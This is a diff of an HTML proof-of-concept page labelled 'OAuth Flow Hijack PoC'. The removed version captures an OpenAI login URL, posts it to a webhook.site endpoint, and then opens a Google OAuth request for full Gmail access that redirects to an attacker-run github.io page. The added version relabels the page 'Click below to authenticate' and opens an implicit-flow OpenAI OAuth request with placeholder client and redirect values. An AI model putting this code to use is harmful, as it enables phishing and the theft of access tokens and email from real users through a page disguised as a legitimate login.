@@ -4,40 +4,17 @@
   <title>OAuth Flow Hijack PoC</title>
 </head>
 <body>
-  <h2>OAuth Flow Hijack PoC</h2>
+  <h2>Click below to authenticate</h2>
   <button id="startAttack">Start Attack</button>
 
   <script>
-    const openaiLogin = "https://auth.openai.com/log-in";
-    const maliciousOAuthUrl = "https://accounts.google.com/o/oauth2/v2/auth?client_id=870583892774-o38qbckfb9vom8s7np3vqcb74cecjc3m.apps.googleusercontent.com&redirect_uri=https://zonia-bad.github.io/oauth-hijack-demo/redirect.html&response_type=token&scope=https%3A%2F%2Fmail.google.com%2F";
-    const webhook = "https://webhook.site/b90ffbf8-2d0e-4734-9487-d6b9cd9e94df"; // Replace with your own
+    const maliciousOAuthUrl = "https://auth.openai.com/oauth/authorize?" +
+      "client_id=YOUR_OPENAI_CLIENT_ID" +
+      "&redirect_uri=https%3A%2F%2Fyourdomain.github.io%2Fredirect.html" +
+      "&response_type=token&scope=openid+email";
 
     document.getElementById("startAttack").addEventListener("click", function () {
-      const openaiWindow = window.open(openaiLogin, "_blank", "width=900,height=700");
-
-      // Try to capture the client_id from OpenAI login window
-      const interval = setInterval(() => {
-        try {
-          const href = openaiWindow.location.href;
-
-          if (href.includes("client_id")) {
-            clearInterval(interval);
-
-            // Send OpenAI client_id to the webhook
-            fetch(webhook, {
-              method: "POST",
-              headers: { "Content-Type": "text/plain" },
-              body: `OpenAI client_id URL: ${href}`
-            });
-
-            // Close original window and open the malicious OAuth window
-            openaiWindow.close();
-            const maliciousWin = window.open(maliciousOAuthUrl, "_blank", "width=900,height=700");
-          }
-        } catch (e) {
-          // Cross-origin: wait for URL to be same-origin or accessible
-        }
-      }, 1000);
+      window.open(maliciousOAuthUrl, "_blank", "width=900,height=700");
     });
   </script>
 </body>
